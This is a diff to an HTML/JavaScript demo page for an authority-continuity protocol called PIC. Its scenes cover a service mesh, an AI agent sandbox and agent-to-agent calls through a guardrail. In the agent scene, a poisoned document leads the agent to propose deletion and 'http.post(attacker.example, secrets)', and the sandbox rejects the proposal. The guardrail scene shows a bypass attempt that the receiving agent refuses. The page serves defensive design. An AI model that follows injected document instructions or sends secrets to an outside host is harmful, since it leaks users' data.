@@ -4,7 +4,7 @@
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>PIC Use Cases</title>
-<meta name="description" content="Authority continuity at work: a service mesh whose data plane exchanges OAuth at the edge, an AI agent sandbox that converts proposals into continuity, and a PDP whose decisions become verifiable facts instead of one-time ALLOWs." />
+<meta name="description" content="Authority continuity at work: a service mesh whose data plane exchanges OAuth at the edge, an AI agent sandbox that converts proposals into continuity, and agent-to-agent crossings governed by ordinary outer ENFORCE continuities." />
 <script async src="https://plausible.io/js/pa-i7fASAHMgS-8ZoTMzxiGY.js"></script>
 <script>
   window.plausible = window.plausible || function(){ (window.plausible.q = window.plausible.q || []).push(arguments); };
@@ -364,7 +364,7 @@ async function meshHappyTail(){
   await movePkt("ful","plane",380);
   await logLine('<span class="dim">data plane → pic-x</span> · candidate · Transition 2 — <span class="dim">response: settled</span>',260);
   await pingPicx("plane");
-  await logLine('<span class="ok">✓</span> Transition 2 settled · remove_bitmap h\'01\' → <span class="k">orders:write dropped</span> · <span class="k">PCA 2</span> = {orders:read} · position 2');
+  await logLine('<span class="ok">✓</span> Transition 2 settled · remove_bitmap h\'02\' → <span class="k">orders:write dropped</span> · <span class="k">PCA 2</span> = {orders:read} · position 2');
   await movePkt("plane","shp",520); tileState("shp","pass"); setSub("shp","PCA 2 · {read}"); tileState("plane","pass"); pktHide();
 }
 async function runMESH(){
@@ -441,7 +441,7 @@ async function pingPicx(from){
 }
 const AGENT={
   title:"An agent that proposes, a sandbox that continues",
-  sub:"The user asks: “summarize report-42 and email it to me.” The request enters the sandbox perimeter, where the sandbox — the PIC compliance layer — owns the lineage: it exchanges the user's intent at PIC-X and converts accepted proposals into Transitions. The agent only proposes — no credentials, no protocol. And the chain does not stop at the tools: the docs tool continues to the report store, the mail tool to the relay — downstream APIs and workers calling each other, every hop advancing the same lineage at PIC-X. Halfway through, the document turns out to be poisoned."
+  sub:"The user asks: “summarize report-42 and email it to me.” The request enters the sandbox perimeter, where the sandbox — the PIC compliance layer — owns the lineage: it exchanges the user's intent at PIC-X and converts accepted proposals into Transitions. The agent only proposes — no credentials, no protocol. The user lineage continues through docs → report store and mail → relay; the store’s audit housekeeping is shown as a separate lineage from its own origin, carried beside Alice’s context but never merged. Halfway through, the document turns out to be poisoned."
 };
 function renderAGENT(){
   cancelRuns();
@@ -480,7 +480,7 @@ async function runAGENT(){
   await logLine('<span class="ok">✓</span> Transition 2 settled · the docs tool calls the <span class="k">report store</span> directly — it verifies the settled continuation, serves report-42 · remove_bitmap h\'01\' → read dropped after use · PCA 2 = {mail:send:user-123}');
   setSub("runtime","PCA 2 · {mail:send}");
   await logLine('<span class="dim">report store → audit worker · its own housekeeping:</span> a <span class="k">new lineage from its own origin</span> — Alice’s C₀ untouched, never merged');
-  await logLine('<span class="dim">own lineage, same rule: the store exchanges at pic-x, then calls the audit worker directly — no call skips the realm</span>',260);
+  await logLine('<span class="dim">own lineage, same rule: the store settles its own advancement at pic-x, then calls the audit worker directly — no continuation skips settlement</span>',260);
   await pingPicx("store");
   await movePkt("store","audit",480); linkFlash("store","audit"); tileState("audit","pass"); setSub("audit","own lineage · settled");
   pktHide();
@@ -493,7 +493,7 @@ async function runAGENT(){
   await movePkt("agent","runtime",480); pktHide(); pktBad(false);
   await logLine('<span class="dim">agent (influenced) →</span> propose <span class="k">http.post(attacker.example, secrets)</span>',300);
   linkFlash("runtime","http",true); tileState("http","fail"); setSub("http","blocked");
-  await logLine('<span class="bad">✕</span> http:post ∉ C₀ — <span class="bad">rejected</span> · <span class="dim">the sandbox cannot even encode the transition</span>');
+  await logLine('<span class="bad">✕</span> http:post ∉ C₀ — <span class="bad">rejected</span> · <span class="dim">the sandbox cannot encode a valid Profile 0.2 transition</span>');
   linkFlash("agent","runtime");
   await logLine('<span class="dim">agent →</span> propose <span class="k">mail.send(user-123, summary)</span>',600);
   await logLine('<span class="dim">sandbox → pic-x</span> · candidate · Transition 3 — <span class="dim">response: settled</span>',260);
@@ -506,7 +506,7 @@ async function runAGENT(){
   await logLine('<span class="ok">✓</span> Transition 4 settled · the mail tool calls the <span class="k">mail relay</span> directly — it verifies the settled continuation and delivers · mail:send dropped after use · <span class="k">PCA 4 = { }</span>');
   setSub("runtime","PCA 4 · { }"); tileState("runtime","pass"); pktHide();
   await logLine('<span class="ok">✓ task complete</span> · final executable authority: <span class="k">zero</span>');
-  setVerdict("ok",'<b>The injection ran. The damage is unrepresentable.</b> The execution went three levels deep — sandbox → tool → downstream API → worker — and every hop was a verified, narrowing continuation of Alice’s intent at PIC-X. The agent was fully influenced — it genuinely proposed delete and exfiltrate — and it did not matter: <b>C₀ never contained those privileges</b>, so the poisoned document’s best move was a proposal that cannot exist. The audit call ran in the store’s <i>own</i> lineage, from its own origin — carried alongside, never merged. The task finished holding <b>nothing</b>.');
+  setVerdict("ok",'<b>The injection ran. The damage is unrepresentable.</b> Alice’s user-authorized path stayed inside verified, narrowing continuations at PIC-X: sandbox → docs → report store, then sandbox → mail → relay. The agent was fully influenced — it genuinely proposed delete and exfiltrate — and it did not matter: <b>C₀ never contained those privileges</b>, so the poisoned document’s best move was a proposal that cannot exist. The audit call ran in the store’s <i>own</i> lineage, from its own origin — carried alongside, never merged. The task finished holding <b>nothing</b>.');
   setBusy(false);
 }
 
@@ -536,7 +536,7 @@ const GR_SCENE={
 };
 const GR={
   title:"Agent calls agent — through the guardrail, or not at all",
-  sub:"Agent A and agent B each run in their own sandbox, each with their own PIC lineage — independent roots, never merged. When A needs B, A goes to the guardrail first: it verifies both lineages, applies the enforcement function, and hands its proof back to A. A then presents both to PIC-X — its valid PIC Token JWT and the guardrail proof. Only with both does PIC-X advance the continuity and return the new settled JWT; only then does A call agent B, directly. Skip the guardrail, and there is nothing to advance — and nothing B will accept."
+  sub:"Agent A and agent B each run in their own sandbox, each with their own PIC lineage — independent roots, never merged. When A needs B, A goes to the guardrail first: it verifies the outer continuity and the bound Composition Collection, applies the enforcement function, and produces the next ordinary outer ENFORCE advancement. PIC-X settles that candidate like any other PIC continuation; only then does A call agent B, directly. Skip the guardrail, and there is no valid outer continuation B will accept."
 };
 function renderGR(){
   cancelRuns();
@@ -559,17 +559,17 @@ async function runGR(){
   await logLine('<span class="dim">agent A → agent B?</span> the crossing is governed — <span class="k">A must pass the guardrail first</span>');
   await movePkt("agentA","guardrail",650); zoneFx(1,"breach"); tileActive("guardrail");
   await logLine('<span class="ok">✓</span> guardrail verifies <span class="k">lineage A</span> · verifies <span class="k">lineage B</span> — evaluated together, <span class="k">never merged</span> <span class="dim">(the spec’s Composition Collection)</span>');
-  await logLine('<span class="dim">enforcement function:</span> <span class="ok">permit</span> for this exact crossing <span class="dim">(a PDP is one possible implementation)</span>');
+  await logLine('<span class="dim">enforcement function:</span> <span class="ok">permit</span> for this exact crossing <span class="dim">(implementation-neutral; policy is just one input)</span>');
   await movePkt("guardrail","agentA",650); linkFlash("agentA","guardrail"); tileState("guardrail","pass"); setSub("guardrail","permit · hop-specific");
-  await logLine('<span class="dim">⟵ the guardrail hands its proof back to agent A</span> — enforcementResult: permit, bound to the collection commitment');
-  await logLine('<span class="dim">agent A → pic-x</span> · candidate = <span class="k">valid PIC Token JWT + guardrail proof</span>',260);
+  await logLine('<span class="dim">⟵ the guardrail produces the outer advancement proposal</span> — enforcementResult: permit, bound to the collection commitment');
+  await logLine('<span class="dim">agent A → pic-x</span> · candidate outer <span class="k">PIC Token JWT</span> with one Transition binding collection commitment + permit',260);
   await movePkt("agentA","picx",520); linkFlash("agentA","picx");
-  await logLine('<span class="ok">✓</span> PIC-X advances <span class="k">only with both</span> — valid continuity AND the guardrail proof → settled outer <span class="k">PIC Token JWT 1</span>');
-  await movePkt("picx","agentA",520); tileState("agentA","pass"); setSub("agentA","settled · proof embedded");
+  await logLine('<span class="ok">✓</span> PIC-X settles the ordinary outer continuation — valid ENFORCE authority, PoR, collection binding, and bound permit → settled outer <span class="k">PIC Token JWT 1</span>');
+  await movePkt("picx","agentA",520); tileState("agentA","pass"); setSub("agentA","settled · bound permit");
   await logLine('<span class="dim">agent A → agent B</span> · <span class="k">direct call</span>, carrying the settled continuation',260);
-  await movePkt("agentA","agentB",900); linkFlash("agentA","agentB"); tileState("agentB","pass"); setSub("agentB","proof verified · executes"); pktHide();
-  await logLine('<span class="ok">✓</span> agent B verifies the settled continuation — <span class="k">guardrail proof present</span> → accepts, continues in <span class="k">its own lineage</span> — the union of the two authorities <span class="k">never existed</span>');
-  setVerdict("ok",'<b>PIC of PIC — and the call stays direct.</b> The guardrail evaluated the crossing and handed its proof to agent A; PIC-X advanced the continuity <b>only because both were presented</b> — the valid PIC Token JWT and the guardrail proof. The trust now travels inside the settled token, so A calls B <b>directly</b>: no middlebox, no interception layer. B accepts because the proof is in the continuity — and the permit is <b>hop-specific</b>: this crossing, this context, nothing else.');
+  await movePkt("agentA","agentB",900); linkFlash("agentA","agentB"); tileState("agentB","pass"); setSub("agentB","outer continuation verified"); pktHide();
+  await logLine('<span class="ok">✓</span> agent B verifies the settled outer continuation — <span class="k">collection commitment + permit are bound</span> → accepts, continues in <span class="k">its own lineage</span> — the union of the two authorities <span class="k">never existed</span>');
+  setVerdict("ok",'<b>PIC of PIC — and the call stays direct.</b> The guardrail evaluated the crossing and produced an ordinary outer ENFORCE advancement; PIC-X settled it only because the continuation, PoR, Composition Collection binding, and bound permit all validated. The trust now travels inside the settled continuity, so A calls B <b>directly</b>: no middlebox, no interception layer. B accepts because the permit is bound in the outer continuation — and it is <b>hop-specific</b>: this crossing, this context, nothing else.');
   setBusy(false);
 }
 async function skipGR(){
@@ -585,11 +585,11 @@ async function skipGR(){
   await movePkt("agentA","picx",520); linkFlash("agentA","picx");
   await logLine('<span class="ok">✓</span> pic-x settles it — a valid advancement of lineage A is a valid request. <span class="dim">PIC-X does not know the topology: whether a path required a guardrail is decided by the receiver, not by the realm</span>');
   await movePkt("picx","agentA",520);
-  await logLine('<span class="dim">agent A → agent B · direct call — but with no guardrail proof in the continuity</span>',300);
+  await logLine('<span class="dim">agent A → agent B · direct call — but with no outer ENFORCE continuation bound to the crossing</span>',300);
   pktBad(true); await movePkt("agentA","agentB",900); linkFlash("agentA","agentB",true); pktHide(); pktBad(false);
   await logLine('<span class="bad">✕</span> agent B <span class="k">expected the guardrail</span>: the Sandboxed Execution continuation is absent → <span class="bad">reject</span>');
   await logLine('<span class="dim">the failure is not prevented at the faulty hop — it is blocked at the next conforming one</span>');
-  setVerdict("bad",'<b>Bypass rejected — by the receiver.</b> PIC-X settled a perfectly valid advancement of lineage A: the realm validates requests, not routes. It is <b>agent B</b>, the next conforming executor, that required the crossing to arrive as a Sandboxed Execution — no guardrail proof in the continuity, no call. Each node decides whether its own path demanded a guardrail; <b>the enforcement lives at the conforming receiver</b>.');
+  setVerdict("bad",'<b>Bypass rejected — by the receiver.</b> PIC-X settled a perfectly valid advancement of lineage A: the realm validates requests, not routes. It is <b>agent B</b>, the next conforming executor, that required the crossing to arrive as Sandboxed Execution — no bound outer ENFORCE continuation, no call. Each node decides whether its own path demanded a guardrail; <b>the enforcement lives at the conforming receiver</b>.');
   setBusy(false);
 }
 
